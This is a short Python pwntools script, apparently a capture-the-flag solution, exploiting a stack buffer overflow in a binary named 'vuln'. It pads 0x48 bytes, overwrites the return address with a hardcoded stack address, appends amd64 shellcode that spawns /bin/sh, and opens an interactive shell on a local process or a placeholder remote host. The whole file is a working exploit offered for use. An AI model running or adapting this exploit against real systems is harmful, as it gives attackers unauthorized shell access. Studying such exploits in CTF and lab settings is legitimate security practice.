#!/usr/bin/env python3

from pwn import *

exe = ELF("./vuln")

context.binary = exe
context.arch = 'amd64'
context.terminal = ["urxvt", "-e", "sh", "-c"]


def conn():
	if args.LOCAL:
		r = process([exe.path])
		if args.DEBUG:
			gdb.attach(r)
	else:
		r = remote("addr", 1337)

	return r


def main():
	r = conn()
	#gdb.attach(r)

	# good luck pwning :)

	payload = b"A"*(0x48)
	payload += p64(0x7fffffffddc0 + 0x50) # dependant on ur environment - might nto work lcoally bc we hardcoding ir
	payload += asm(shellcraft.amd64.linux.sh())
	

	r.sendline(payload)


	r.interactive()


if __name__ == "__main__":
	main()
